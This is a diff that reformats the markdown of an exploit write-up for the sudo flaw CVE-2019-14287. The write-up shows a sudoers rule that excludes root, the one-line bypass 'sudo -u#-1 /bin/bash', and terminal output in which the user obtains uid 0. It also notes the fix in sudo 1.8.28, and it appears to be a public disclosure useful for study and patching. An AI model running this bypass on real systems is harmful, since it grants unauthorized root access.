@@ -9,10 +9,10 @@
 # Fix : The bug is fixed in sudo 1.8.28
 # CVE : 2019-14287
 ```
-'''Check for the user sudo permissions
-
+- Check for the user sudo permissions
+```bash
 sudo -l 
-
+```
 User hacker may run the following commands on kali:
     (ALL, !root) /bin/bash
 
@@ -24,26 +24,24 @@ User hacker sudo privilege in /etc/sudoers
 
 # User privilege specification
 root    ALL=(ALL:ALL) ALL
-
 hacker ALL=(ALL,!root) /bin/bash
-
 
 With ALL specified, user hacker can run the binary /bin/bash as any user
 
 EXPLOIT: 
-
+```bash
 sudo -u#-1 /bin/bash
-
+```
 Example : 
-
+```bash
 hacker@kali:~$ sudo -u#-1 /bin/bash
 root@kali:/home/hacker# id
 uid=0(root) gid=1000(hacker) groups=1000(hacker)
 root@kali:/home/hacker#
-
-Description :
+```
+- Description :
 Sudo doesn't check for the existence of the specified user id and executes the with arbitrary user id with the sudo priv
--u#-1 returns as 0 which is root's id
+`-u#-1` returns as `0` which is root's id
 
 and /bin/bash is executed with root permission
 Proof of Concept Code :
